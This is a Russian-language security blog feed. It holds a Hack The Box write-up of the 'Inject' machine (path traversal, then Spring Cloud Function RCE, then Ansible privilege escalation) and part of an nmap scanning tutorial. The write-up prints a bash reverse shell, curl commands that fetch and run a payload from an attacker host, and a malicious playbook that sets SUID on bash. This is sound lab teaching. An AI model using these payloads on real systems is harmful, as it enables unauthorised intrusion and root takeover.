<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ru"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="ru" /><updated>2025-04-30T18:52:05+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Raven Blog</title><subtitle>Блог о кибербезопасности, Blue Team, Red Team и IT в целом</subtitle><entry><title type="html">HTB Writeup Inject</title><link href="http://localhost:4000/writeups/2025/04/30/HTB-Inject.html" rel="alternate" type="text/html" title="HTB Writeup Inject" /><published>2025-04-30T17:07:12+03:00</published><updated>2025-04-30T17:07:12+03:00</updated><id>http://localhost:4000/writeups/2025/04/30/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/writeups/2025/04/30/HTB-Inject.html"><![CDATA[<h1 id="htb-writeup-of-machine-inject">HTB Writeup of machine “Inject”</h1>

<p><img src="/assets/images/HTB_writeup_Inject/Inject.png" alt="Inject" />
<em>IP: 10.10.11.204</em></p>

<blockquote>
  <p>Данный WriteUp был написан давным давно, однако мне очень хочется его здесь увековечить :) Надеюсь тебе он понравится, читатель и ты найдёшь для себя что то новое! С тех пор мой личный подход слега поменялся к похеку машин, скажем так, но в данном WriteUp на мой взгляд хорошо выдержанна методология и сам подход, поэтому почему бы и не оказаться ему тут :)</p>
</blockquote>

<h2 id="анализ-и-сбор-информации-о-цели">Анализ и сбор информации о цели</h2>
<p>Первым делом после подключения по VPN, займёмся сканированием IP адреса на предмет открытых портов и определения соответствующих портам сервисов.</p>

<p>Так как nmap работает медленно, то опрделение открытых портов проведём с помощью утилиты <a href="https://github.com/RustScan/RustScan">rustscan</a> - очень хороший сканер <code class="language-plaintext highlighter-rouge">TCP портов</code>, написанный на языке программирования <code class="language-plaintext highlighter-rouge">Rust</code>.</p>

<p>Получаем следующую картину:
<img src="/assets/images/HTB_writeup_Inject/1.png" alt="rustscan" /></p>

<p>Синтаксис <code class="language-plaintext highlighter-rouge">rustscan</code> следующий: сначала идут флаги и оптции, затем “–”, а затем команды. В нашем случае с помощью опции <code class="language-plaintext highlighter-rouge">-a</code> мы указали нужный нам ip, а с помощью опции <code class="language-plaintext highlighter-rouge">--ulimit</code> мы задаём максимальное колличество колличество выделяемых потоков на сканирование. С помощью команды <code class="language-plaintext highlighter-rouge">-p-</code> мы сканируем весь допустимый диапазон портов.</p>

<p>В результате сканирования обнаруживаем, что открыты порты 22 и 8080. Касаемо 22 порта можем однозначно предположить что это ssh, но всё же нужно проверить.</p>

<p>Проведём сканирование этих портов с помощью <a href="https://nmap.org/download.html">nmap</a>:
<img src="/assets/images/HTB_writeup_Inject/2.png" alt="nmap" /></p>

<p>В данной утилите использвоаны следуюзие флаги:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-sS</code> - SYN сканирование (от имени администратора/суперпользователя);</li>
  <li><code class="language-plaintext highlighter-rouge">-sV</code> - определние сервиса и его версии на сетевых портах;</li>
  <li><code class="language-plaintext highlighter-rouge">-T4</code> - задаём интенсивоность сканирования;</li>
  <li><code class="language-plaintext highlighter-rouge">-sC</code> - применяем стандартные скрипты к портам для расширения выдаваемой информации;</li>
  <li><code class="language-plaintext highlighter-rouge">-p</code> - здадаём список портов для сканирования.</li>
</ul>

<p>В результате сканирования делаем следующие выводы: на данном хосте активно два сервиса: ssh (OpenSSH 8.2p1) и 8080 (nagios-nsca).</p>

<p>Перейдём в браузере по URI <code class="language-plaintext highlighter-rouge">http://10.10.11.204:8080</code>. Проанализируем используемые технологии с помощью плагина браузера <a href="https://www.wappalyzer.com/">wappanalyzer</a>, однако он нам не покажет чего - либо интересного.</p>

<p>Просканируем наличие директорий c помощью <a href="https://github.com/ffuf/ffuf">ffuf</a>:
<img src="/assets/images/HTB_writeup_Inject/3.png" alt="ffuf" />
Обзор используемых опций:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-u</code> сканируемый URL адрес, у которого FUZZ на конце показывает место, которое фаззится</li>
  <li><code class="language-plaintext highlighter-rouge">-fc</code> указывает статусы ответов, которые не подлежат выводу</li>
  <li><code class="language-plaintext highlighter-rouge">-w</code> указывает на путь до файла словаря, который используется для фаззинга</li>
</ul>

<p>В результате сканирования мы понимаем, что на данном сайте существует 3 URL:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.11.204:8080/blogs</code> - обычные записи, ничего интересного;</li>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.11.204:8080/register</code> - стоит заглушка;</li>
  <li><code class="language-plaintext highlighter-rouge">http://10.10.11.204:8080/upload</code> - интересное для нас место, которе позволяет загружать файлы. К нему мы ещё вернёмся.</li>
</ul>

<h2 id="получение-флага-usertxt">Получение флага “user.txt”</h2>

<p>Ранее нами был найден довольно занимательный URL адрес: <code class="language-plaintext highlighter-rouge">http://10.10.11.204:8080/upload</code>.</p>

<p>Пройдя по нему мы можем загрузить картинку. Загрузив картинку нам тут же предлагают её просмотреть:
<img src="/assets/images/HTB_writeup_Inject/4.png" alt="web page" /></p>

<p>Данная возможность нас должна привлечь, так как есть вероятность на возможность просмотра какого угодно файла и тем самым мы получим уязвимость <code class="language-plaintext highlighter-rouge">Path Traversal</code>. проверим свою гипотезу, перехватив запрос с помощью <a href="https://portswigger.net/burp">Burp Suite</a> и исследовав его.</p>

<p>Перехватив запрос мы видим, что имя нашего файла, который мы только что залили, передаётся в качестве аргументов. Попробуем спустится на уровень выше по файловой системе и посмотрим что у нас получится. И по итогу у нас получилось! Наша гипотеза верна и вот что мы увидим по итогу:
<img src="/assets/images/HTB_writeup_Inject/5.png" alt="Path Traversal" /></p>

<p>Здесь мы так же можем видить файл или директорию (но скорее директорию) под названием <code class="language-plaintext highlighter-rouge">java</code>. Это означает что само веб-приложение написанно с использованием стека технологий, свойственного языку программирования <code class="language-plaintext highlighter-rouge">java</code>.  Изучая исходные файлы мы видим это:
<img src="/assets/images/HTB_writeup_Inject/6.png" alt="read source code" /></p>

<p>Изучая импорты в исходниках, мы видим, что использовался <code class="language-plaintext highlighter-rouge">Spring Framework</code>. Этот момент поднаталкивает к мысли попробовать проэксплуатировать одну из популярнийших уязвимостей 2022 года - Spring4Shell (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22963">CVE-2022-22963</a>).</p>

<p><a href="https://github.com/me2nuk/CVE-2022-22963">Пользуясь информацией из данного источника</a>, узнаём, что эксплуатация происходит следующем образом: мы отправляем POST запрос на сервер по пути в URL <code class="language-plaintext highlighter-rouge">/functionRouter</code> с заголовком <code class="language-plaintext highlighter-rouge">"spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('&lt;RCE&gt;')"</code>, где <code class="language-plaintext highlighter-rouge">&lt;RCE&gt;</code> - непосредственно полезная нагрузка, которая будет выполнена <code class="language-plaintext highlighter-rouge">bash</code>. Так же при этом нужно отправить что либо в виде RAW DATA.</p>

<p>Попробуем с помощью утилиты <a href="https://curl.se/">curl</a> создать файл helloHERE.txt в директории /tmp. Результат мы сможем проверить с помощью ранее найденной <code class="language-plaintext highlighter-rouge">Path Traversal</code>. Вот что у нас получится:</p>

<p><img src="/assets/images/HTB_writeup_Inject/7.png" alt="spring4shell" /></p>

<p>Мы успешно смогли создать файл! А значит данное веб приложение подверженно <code class="language-plaintext highlighter-rouge">RCE</code> и мы потенциально можем проникнуть на сервер.</p>

<p>Суть нашего проникновения на сервер будет заключаеться в создании <code class="language-plaintext highlighter-rouge">ReverseShell</code>, то есть инциировании соединения от лица машины жертвы на машину атакующего с передачей атакующему командной оболочки. Наш <code class="language-plaintext highlighter-rouge">ReverseShell</code> будет в качетсве файла <code class="language-plaintext highlighter-rouge">RS.sh</code> со следующим содержимым:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;IP_of_attacker&gt;/&lt;port_of_dest&gt; 0&gt;&amp;1
</code></pre></div></div>

<blockquote>
  <p>Для формирования разного рода ReverseShell нагрузкок очень хорошо подойдёт следующий <a href="https://www.revshells.com/">ресурс</a>. А использование в качестве прослушивателя <code class="language-plaintext highlighter-rouge">rlwrap -cAr nc -lvnp &lt;port&gt;</code> позволяет сохранять историю команд. Так же всегда стоит для удобства настраивать разного рода переменные окружения для оболочки для удобства и вызывать на всякий случай через python ещё раз bash оболочку, так как в ином случае может быть что мы имеем дело с слегка ограниченной оболочкой. Такими темпами мы очень облегчим себе труды.</p>
</blockquote>

<p>Данная команда осуществит вызов <code class="language-plaintext highlighter-rouge">bash</code> в интерактивном режиме, где все стандартные потоки вывода и вывода ошибок будут перенаправленны в сетевое устройстви, которое в нашем случае будет сетевым подключением, в свою очередь от которого стандартный поток ввода будет передаваться на стандартный поток вывода.</p>

<p>Данный <code class="language-plaintext highlighter-rouge">ReverseShell</code> мы поместим в директорию <code class="language-plaintext highlighter-rouge">/tmp</code> и выполним, при этом в свою очередь будем принимать сетевое подключение с помощью утилиты <a href="https://netcat.sourceforge.net/">netcat</a> и команда для этого ожидания подключения примет следующий вид: <code class="language-plaintext highlighter-rouge">nc -nvpl 1337</code>, где <code class="language-plaintext highlighter-rouge">1337</code> - номер порта, на который мы ожидаем получить подключение.</p>

<p>Так же в директории, в которой у нас хранится <code class="language-plaintext highlighter-rouge">RS.sh</code> файл, мы поднимем <code class="language-plaintext highlighter-rouge">http сервер</code>, так как свой файл мы загрузим на хост атакуемого. Запуск <code class="language-plaintext highlighter-rouge">http сервера</code> на <code class="language-plaintext highlighter-rouge">80 порту</code> произведём с помощью команды <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code>.</p>

<p>Дальнейние команды для отправки файла и его запуска на сервере примут следующий вид:</p>

<p>1) <code class="language-plaintext highlighter-rouge">curl -X POST http://10.10.11.204:8000/functionRouter -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('curl http://&lt;IP_address_of_attacker&gt;/RS.sh -o /tmp/RS.sh')" --data-raw 'data' -v</code>
2) <code class="language-plaintext highlighter-rouge">curl -X POST http://10.10.11.204:8000/functionRouter -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('bash /tmp/RS.sh')" --data-raw 'data' -v</code></p>

<p>После всех этих действий, мы попадаем в систему под учётной записью <code class="language-plaintext highlighter-rouge">frank</code>:
<img src="/assets/images/HTB_writeup_Inject/8.png" alt="access as frank" /></p>

<p>Теперь перейдём в домашнюю директорию данного пользователя с помощью команды <code class="language-plaintext highlighter-rouge">cd</code>. В надежде увидеть файл <code class="language-plaintext highlighter-rouge">user.txt</code> нас ждёт облом. А это значит что непривилегированный пользователь не один в системе. Cпустимcя на уровень выше по файловой системе и обнаружим там корневую директорию пользователя <code class="language-plaintext highlighter-rouge">phil</code>. Перейдя в неё, мы найдём заветный файл, но само собой мы не сможем прочесть его.</p>

<p>Но возможно мы недостаточно осмотрели свою корневую домашнюю директорию. Перейдя в неё попробуем вывести содержимое с помощью <code class="language-plaintext highlighter-rouge">ls -a</code> и мы обнаружим в скрытых файлах некий файл <code class="language-plaintext highlighter-rouge">.m2</code>. При попытки прочесть содержимое файла нам подсказывают, что это директория. Перейдя в неё, находим файл <code class="language-plaintext highlighter-rouge">settings.xml</code>. Прочитав его, узнаем учётные данные пользователя <code class="language-plaintext highlighter-rouge">phil</code>:</p>

<p><img src="/assets/images/HTB_writeup_Inject/9.png" alt="find credential of phil" /></p>

<p>Авторизуемся как <code class="language-plaintext highlighter-rouge">phil</code> с помощью <code class="language-plaintext highlighter-rouge">su phil</code>, а затем введём <code class="language-plaintext highlighter-rouge">bash -i</code> для получения интерактивной оболочки. Переместимся в его домашнюю директорию и заберём флаг!</p>

<p><img src="/assets/images/HTB_writeup_Inject/10.png" alt="user flag" /></p>

<h2 id="получение-флага-roottxt">Получение флага “root.txt”</h2>

<p>Есть несколько способов повысить свои привелегии в системе до прав <code class="language-plaintext highlighter-rouge">root</code> пользователя. Можно с помощью <code class="language-plaintext highlighter-rouge">sudo -l</code> узнать, на выполнение каких привилегированных команд у нас есть права или же и вовсе найти файлы с установленным <code class="language-plaintext highlighter-rouge">SUID</code> битом с помощью <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code> и тем самым найти какой либо недочёт в разграничении прав доступа (к примеру используя <a href="https://gtfobins.github.io/">GTFO</a>), но не один из этих способов ни к чему не привёл. Тогда мы можем заметить в корневой директории каталог <code class="language-plaintext highlighter-rouge">/opt</code>, в котором обычно устанавливается дополнительное программное обеспечение. Перейдём в него и поищем что - нибудь интересное. По пути <code class="language-plaintext highlighter-rouge">/opt/automation/tasks/</code> находим файл <code class="language-plaintext highlighter-rouge">playbook_1.yml</code>. Прочитав его, понимаем, что это конфигурационный файл для <code class="language-plaintext highlighter-rouge">ansible</code> - система управления конфигруациями.</p>

<p>Данная система работает с правами <code class="language-plaintext highlighter-rouge">root</code>. Для компрометации системы принимаем решение написать вредоносную конфигурацию, который установил бы <code class="language-plaintext highlighter-rouge">SUID</code> бит у оболочки <code class="language-plaintext highlighter-rouge">bash</code>. Изучая особенности данной технологии и опираясь на <a href="https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/">источник</a>, содаём вредоносный <code class="language-plaintext highlighter-rouge">yml файл</code>, который назовём <code class="language-plaintext highlighter-rouge">evil_root.yml</code> со следующим содержимым:</p>
<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
  <span class="na">tasks</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">EvilRoot</span>
      <span class="na">ansible.builtin.shell</span><span class="pi">:</span>
        <span class="s">chmod +s /bin/bash</span>
      <span class="na">become</span><span class="pi">:</span> <span class="kc">true</span>
</code></pre></div></div>

<p>Так же в результате проведения эксперимента выяснилось, что в <code class="language-plaintext highlighter-rouge">/opt/automation/tasks/</code> мы можем копировать файлы, хотя создовать само собой не можем, так как недостаточно прав доступа.</p>

<p>Доставим этот файл в директорию <code class="language-plaintext highlighter-rouge">/tmp</code>, а оттуда скопируем данный файл в <code class="language-plaintext highlighter-rouge">/opt/automation/tasks/</code> и будем ждать, когда произойдёт считывание конфигураций и выполнение нашей полезной нагрузки. Затем вводим <code class="language-plaintext highlighter-rouge">bash -p</code> для запуска <code class="language-plaintext highlighter-rouge">bash</code> с привилегированными правами. В результате чего мы получаем необходимые права и забираем наш флаг!</p>

<p><img src="/assets/images/HTB_writeup_Inject/11.png" alt="root flag" /></p>

<p>На этом машина полностью под нашим контролем и это прекрасно!</p>]]></content><author><name></name></author><category term="writeups" /><category term="writeups" /><category term="spring4shell" /><category term="lpe" /><category term="linux" /><summary type="html"><![CDATA[HTB Writeup of machine “Inject” IP: 10.10.11.204 Данный WriteUp был написан давным давно, однако мне очень хочется его здесь увековечить :) Надеюсь тебе он понравится, читатель и ты найдёшь для себя что то новое! С тех пор мой личный подход слега поменялся к похеку машин, скажем так, но в данном WriteUp на мой взгляд хорошо выдержанна методология и сам подход, поэтому почему бы и не оказаться ему тут :) Анализ и сбор информации о цели Первым делом после подключения по VPN, займёмся сканированием IP адреса на предмет открытых портов и определения соответствующих портам сервисов. Так как nmap работает медленно, то опрделение открытых портов проведём с помощью утилиты rustscan - очень хороший сканер TCP портов, написанный на языке программирования Rust. Получаем следующую картину: Синтаксис rustscan следующий: сначала идут флаги и оптции, затем “–”, а затем команды. В нашем случае с помощью опции -a мы указали нужный нам ip, а с помощью опции --ulimit мы задаём максимальное колличество колличество выделяемых потоков на сканирование. С помощью команды -p- мы сканируем весь допустимый диапазон портов. В результате сканирования обнаруживаем, что открыты порты 22 и 8080. Касаемо 22 порта можем однозначно предположить что это ssh, но всё же нужно проверить. Проведём сканирование этих портов с помощью nmap: В данной утилите использвоаны следуюзие флаги: -sS - SYN сканирование (от имени администратора/суперпользователя); -sV - определние сервиса и его версии на сетевых портах; -T4 - задаём интенсивоность сканирования; -sC - применяем стандартные скрипты к портам для расширения выдаваемой информации; -p - здадаём список портов для сканирования. В результате сканирования делаем следующие выводы: на данном хосте активно два сервиса: ssh (OpenSSH 8.2p1) и 8080 (nagios-nsca). Перейдём в браузере по URI http://10.10.11.204:8080. Проанализируем используемые технологии с помощью плагина браузера wappanalyzer, однако он нам не покажет чего - либо интересного. Просканируем наличие директорий c помощью ffuf: Обзор используемых опций: -u сканируемый URL адрес, у которого FUZZ на конце показывает место, которое фаззится -fc указывает статусы ответов, которые не подлежат выводу -w указывает на путь до файла словаря, который используется для фаззинга В результате сканирования мы понимаем, что на данном сайте существует 3 URL: http://10.10.11.204:8080/blogs - обычные записи, ничего интересного; http://10.10.11.204:8080/register - стоит заглушка; http://10.10.11.204:8080/upload - интересное для нас место, которе позволяет загружать файлы. К нему мы ещё вернёмся. Получение флага “user.txt” Ранее нами был найден довольно занимательный URL адрес: http://10.10.11.204:8080/upload. Пройдя по нему мы можем загрузить картинку. Загрузив картинку нам тут же предлагают её просмотреть: Данная возможность нас должна привлечь, так как есть вероятность на возможность просмотра какого угодно файла и тем самым мы получим уязвимость Path Traversal. проверим свою гипотезу, перехватив запрос с помощью Burp Suite и исследовав его. Перехватив запрос мы видим, что имя нашего файла, который мы только что залили, передаётся в качестве аргументов. Попробуем спустится на уровень выше по файловой системе и посмотрим что у нас получится. И по итогу у нас получилось! Наша гипотеза верна и вот что мы увидим по итогу: Здесь мы так же можем видить файл или директорию (но скорее директорию) под названием java. Это означает что само веб-приложение написанно с использованием стека технологий, свойственного языку программирования java. Изучая исходные файлы мы видим это: Изучая импорты в исходниках, мы видим, что использовался Spring Framework. Этот момент поднаталкивает к мысли попробовать проэксплуатировать одну из популярнийших уязвимостей 2022 года - Spring4Shell (CVE-2022-22963). Пользуясь информацией из данного источника, узнаём, что эксплуатация происходит следующем образом: мы отправляем POST запрос на сервер по пути в URL /functionRouter с заголовком "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('&lt;RCE&gt;')", где &lt;RCE&gt; - непосредственно полезная нагрузка, которая будет выполнена bash. Так же при этом нужно отправить что либо в виде RAW DATA. Попробуем с помощью утилиты curl создать файл helloHERE.txt в директории /tmp. Результат мы сможем проверить с помощью ранее найденной Path Traversal. Вот что у нас получится: Мы успешно смогли создать файл! А значит данное веб приложение подверженно RCE и мы потенциально можем проникнуть на сервер. Суть нашего проникновения на сервер будет заключаеться в создании ReverseShell, то есть инциировании соединения от лица машины жертвы на машину атакующего с передачей атакующему командной оболочки. Наш ReverseShell будет в качетсве файла RS.sh со следующим содержимым: #!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;IP_of_attacker&gt;/&lt;port_of_dest&gt; 0&gt;&amp;1 Для формирования разного рода ReverseShell нагрузкок очень хорошо подойдёт следующий ресурс. А использование в качестве прослушивателя rlwrap -cAr nc -lvnp &lt;port&gt; позволяет сохранять историю команд. Так же всегда стоит для удобства настраивать разного рода переменные окружения для оболочки для удобства и вызывать на всякий случай через python ещё раз bash оболочку, так как в ином случае может быть что мы имеем дело с слегка ограниченной оболочкой. Такими темпами мы очень облегчим себе труды. Данная команда осуществит вызов bash в интерактивном режиме, где все стандартные потоки вывода и вывода ошибок будут перенаправленны в сетевое устройстви, которое в нашем случае будет сетевым подключением, в свою очередь от которого стандартный поток ввода будет передаваться на стандартный поток вывода. Данный ReverseShell мы поместим в директорию /tmp и выполним, при этом в свою очередь будем принимать сетевое подключение с помощью утилиты netcat и команда для этого ожидания подключения примет следующий вид: nc -nvpl 1337, где 1337 - номер порта, на который мы ожидаем получить подключение. Так же в директории, в которой у нас хранится RS.sh файл, мы поднимем http сервер, так как свой файл мы загрузим на хост атакуемого. Запуск http сервера на 80 порту произведём с помощью команды sudo python3 -m http.server 80. Дальнейние команды для отправки файла и его запуска на сервере примут следующий вид: 1) curl -X POST http://10.10.11.204:8000/functionRouter -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('curl http://&lt;IP_address_of_attacker&gt;/RS.sh -o /tmp/RS.sh')" --data-raw 'data' -v 2) curl -X POST http://10.10.11.204:8000/functionRouter -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('bash /tmp/RS.sh')" --data-raw 'data' -v После всех этих действий, мы попадаем в систему под учётной записью frank: Теперь перейдём в домашнюю директорию данного пользователя с помощью команды cd. В надежде увидеть файл user.txt нас ждёт облом. А это значит что непривилегированный пользователь не один в системе. Cпустимcя на уровень выше по файловой системе и обнаружим там корневую директорию пользователя phil. Перейдя в неё, мы найдём заветный файл, но само собой мы не сможем прочесть его. Но возможно мы недостаточно осмотрели свою корневую домашнюю директорию. Перейдя в неё попробуем вывести содержимое с помощью ls -a и мы обнаружим в скрытых файлах некий файл .m2. При попытки прочесть содержимое файла нам подсказывают, что это директория. Перейдя в неё, находим файл settings.xml. Прочитав его, узнаем учётные данные пользователя phil: Авторизуемся как phil с помощью su phil, а затем введём bash -i для получения интерактивной оболочки. Переместимся в его домашнюю директорию и заберём флаг! Получение флага “root.txt” Есть несколько способов повысить свои привелегии в системе до прав root пользователя. Можно с помощью sudo -l узнать, на выполнение каких привилегированных команд у нас есть права или же и вовсе найти файлы с установленным SUID битом с помощью find / -perm -u=s -type f 2&gt;/dev/null и тем самым найти какой либо недочёт в разграничении прав доступа (к примеру используя GTFO), но не один из этих способов ни к чему не привёл. Тогда мы можем заметить в корневой директории каталог /opt, в котором обычно устанавливается дополнительное программное обеспечение. Перейдём в него и поищем что - нибудь интересное. По пути /opt/automation/tasks/ находим файл playbook_1.yml. Прочитав его, понимаем, что это конфигурационный файл для ansible - система управления конфигруациями. Данная система работает с правами root. Для компрометации системы принимаем решение написать вредоносную конфигурацию, который установил бы SUID бит у оболочки bash. Изучая особенности данной технологии и опираясь на источник, содаём вредоносный yml файл, который назовём evil_root.yml со следующим содержимым: - hosts: localhost tasks: - name: EvilRoot ansible.builtin.shell: chmod +s /bin/bash become: true Так же в результате проведения эксперимента выяснилось, что в /opt/automation/tasks/ мы можем копировать файлы, хотя создовать само собой не можем, так как недостаточно прав доступа. Доставим этот файл в директорию /tmp, а оттуда скопируем данный файл в /opt/automation/tasks/ и будем ждать, когда произойдёт считывание конфигураций и выполнение нашей полезной нагрузки. Затем вводим bash -p для запуска bash с привилегированными правами. В результате чего мы получаем необходимые права и забираем наш флаг! На этом машина полностью под нашим контролем и это прекрасно!]]></summary></entry><entry><title type="html">Let’s talk a little bit about nmap</title><link href="http://localhost:4000/recon/2025/04/30/Let's-talk-a-little-bit-about-nmap.html" rel="alternate" type="text/html" title="Let’s talk a little bit about nmap" /><published>2025-04-30T01:42:32+03:00</published><updated>2025-04-30T01:42:32+03:00</updated><id>http://localhost:4000/recon/2025/04/30/Let&apos;s-talk-a-little-bit-about-nmap</id><content type="html" xml:base="http://localhost:4000/recon/2025/04/30/Let&apos;s-talk-a-little-bit-about-nmap.html"><![CDATA[<h1 id="nmap-утилита-способная-стать-маяком-для-пентестера-при-исследовании-корпоративной-сети">nmap: утилита, способная стать маяком для пентестера при исследовании корпоративной сети</h1>

<p><img src="/assets/images/let's_talk_a_little_bit_about_nmap/samurai.jpg" alt="samurai" /></p>

<h4 id="путь-самурая-начинается-с-поиска-хостов">Путь самурая начинается с поиска хостов</h4>

<p>Начнём наше рассмотрение данной утилиты с её возможности поиска иных устройств в сети и в целом поиска общей информации о сети, в которой мы находимся. При этом само собой мы должны иметь стабильное подключение к сети, нужно что бы исследователь обошёл Port Security и 802.1x если они имеются в сети.</p>

<p>Существует несколько способов и техник поиска доступных устройств в сети:</p>

<ul>
  <li>С помощью отправки ICMP пакетов с помощью утилиты ping. ICMP - это протокол сетевого уровня стека TCP/IP, предназначенный для передачи сервисных сообщений на низком (сетевом) уровне. Обычно используется для передачи сообщений об ошибках и других исключительных ситуациях, возникших при передаче данных, например, недоступность хоста. ICMP включает в себя несколько типов сообщений, и в их числе echo request(8) и echo responce(0), которые используются для проверки доступности узлов: если хост получил эхо-запрос, он отправляет обратно эхо-ответ, что говорит об его доступности. Достоинством данного метода сканирования так же является сбор маршрутов до хостов, что может быть очень полезным для сбора более подробной информации о сети. Однако часто ICMP-траффик заблокирован в сети. В таком случае данный метод сканирования недоступен.</li>
  <li>Так как при подключении к локальной сети у нас на руках имеется маска сети, и нам самим назначен IP адрес, то мы можем руководствуясь гипотезой, что каждый хост в системе существует для чего-то, сканировать у всех возможных хостов самые распространённые и ожидаемые порты на их открытость. Если какая-то информация о состоянии порта появляется - значит хост существует. Данный способ крайне медленен, сильно шумный и, как следствие, ставит в очень уязвимое положение исследователя перед IDS/IPS. Однако данный способ имеет право на жизнь и его стоит использовать.</li>
  <li>Отправка ARP запросов на указанные IP для якобы получения их MAC адреса. ARP - это протокол канального уровня, позволяющий узнать MAC-адрес хоста по его IP и наоборот. MAC-адрес как и IP может быть полезной информацией для исследователя, но он может быть получен таким образом в пределах одной локальной сети, так как ARP-запрос отправляется по broadcast mac адресу (FF:FF:FF:FF:FF:FF) и ограничивается одним VLAN, в рамках которого мы находимся. Данный способ довольно хороший, так как ARP-траффик считается легитимным. Однако главное что б при этом не было никакого второго исследователя безопасности, осуществляющего злостную атаку ARP - Spoofing.</li>
</ul>

<p>Поняв основные способы поиска хостов в системе, попробуем понять как нам всё это осуществить с помощью nmap. Для этого в nmap существуют следующие опции:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-sP</code> - ping-сканирование. По умолчанию посылаются запрос на ICMP эхо-ответ и TCP ACK пакет на порт 80. При этом возможно понадобится –traceroute - проводить трассировку маршрута до каждого найденного хоста.</li>
  <li><code class="language-plaintext highlighter-rouge">-PS</code> - пингование посредством отправки TCP SYN пакета на указанные порты.</li>
  <li><code class="language-plaintext highlighter-rouge">-PU</code> - пингование посредством отправки UDP пакета на указанные порты.</li>
  <li><code class="language-plaintext highlighter-rouge">-PE</code>; <code class="language-plaintext highlighter-rouge">-PP</code>; <code class="language-plaintext highlighter-rouge">-PM</code> - ICMP-пинг других типов: запрос временной метки (13), информационный запрос (15), запрос адресной маски (17). Многие хосты и брандмауэры могут блокировать исключительно ICMP-пакеты типа echo request, но в спецификации ICMP присутствуют еще несколько типов запросов, позволяющих получить ответ от хоста.</li>
</ul>

<p>Так же для достижения эффективности или скрытности могут понадобиться следующе опции:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-sn</code> - данная опция говорит nmap не проводить сканирование открытых портов по списку популярных портов после обнаружение хоста. Это может кардинально ускорить процесс поиска всех хостов в нашей сети.</li>
  <li><code class="language-plaintext highlighter-rouge">-n</code> - данная опция отключает разрешение DNS-имен. По умолчанию при обнаружении хостов nmap также производит обратное DNS разрешение, для того, чтобы по найденным IP-адресам попробовать узнать их доменные имена.</li>
  <li><code class="language-plaintext highlighter-rouge">--data-length &lt;length&gt;</code> - данная опция добавляет <code class="language-plaintext highlighter-rouge">&lt;length&gt;</code> случайных байтов информации к каждому пакету, что помогает сделать сканирование менее заметным и более похожим на пакеты, генерируемые утилитой ping.</li>
  <li><code class="language-plaintext highlighter-rouge">--randomize-hosts</code> - данная опция перемешивает порядок сканирования хостов, чтобы сделать сканирование менее подозрительным при анализе трафика.</li>
  <li><code class="language-plaintext highlighter-rouge">-D</code> - данная опция заставляет nmap использовать фиктивные хосты (decoys) для того, чтобы скрыть IP-адрес атакующего от IDP/IPS систем.</li>
</ul>

<h4 id="каждая-успешная-атака---это-успешно-найденные-двери">Каждая успешная атака - это успешно найденные двери</h4>

<p>Идентифицировав отдельные сетевые узлы в сети, следующим шагом будет являться определение состояния сетевых портов хоста. Сетевой порт - это элемент транспортного уровня модели TCP/IP. Если вкратце - сетевой порт, это сетевой интерфейс, предоставляемый Операционной Системой процессу для взаимодействия по сети.</p>

<p>Какими же состояния могут приобретать сетевые порты и по каким принципам идентифицируется то или иное состояние?</p>

<p>На транспортном уровне сетевой модели TCP/IP происходит распределение трафика между приложениями системы за счёт перенаправления его на сетевые порты. Сетевой порт представляет собой число от 1 до 65535, указанное и известное обоим приложениям, между которыми устанавливается связь. На данном уровне два самых популярных протокола TCP и UDP. При использовании протокола TCP образуется соединение, которое гарантирует отправку тех или иных сетевых пакетов и происходит контролирование порядка следования сетевых пакетов. Это происходит за счёт трёх этапного рукопожатия:</p>

<ol>
  <li>
    <p>Клиент отправляет сетевой пакет с установленным флагом SYN. При этом пакету присваивается произвольный порядковый номер в интервале от 1 до 232, относительно которого будет вестись дальнейший отсчет последовательности пакетов в соединении.</p>
  </li>
  <li>
    <p>Сервер получает запрос и отправляет ответный пакет с одновременно установленными флагами SYN+ACK, при этом записывает в поле «номер подтверждения», полученный порядковый номер, увеличенный на 1 (что подтверждает получение первого пакета), а также устанавливает свой порядковый номер, который, как и в SYN-пакете, выбирается произвольно.</p>
  </li>
  <li>
    <p>После получения клиентом пакета с флагами SYN+ACK соединение считается установленным, клиент, в свою очередь, отправляет в ответ пакет с флагом ACK, обновленными номерами последовательности, и не содержащий полезной нагрузки.</p>
  </li>
</ol>

<p>При UDP сетевой пакет просто отправляется по сети до указанного хоста на указанный порт, при этом нет гарантии что пакет дойдёт до адресата, так же никак не контролируется порядок следования пакетов, однако при использовании этого протокола пакет если и достигает адресата, то это происходит намного быстрее, чем при TCP. Открытость или закрытость данного порта определяется с помощью ответов на отправленные ICMP пакеты. Если порт не активен, то прилетает ответ ICMP port-unreachable. Данный метод не эффективен, если происходит фильтрация ICMP пакетов с помощью Firewall.</p>

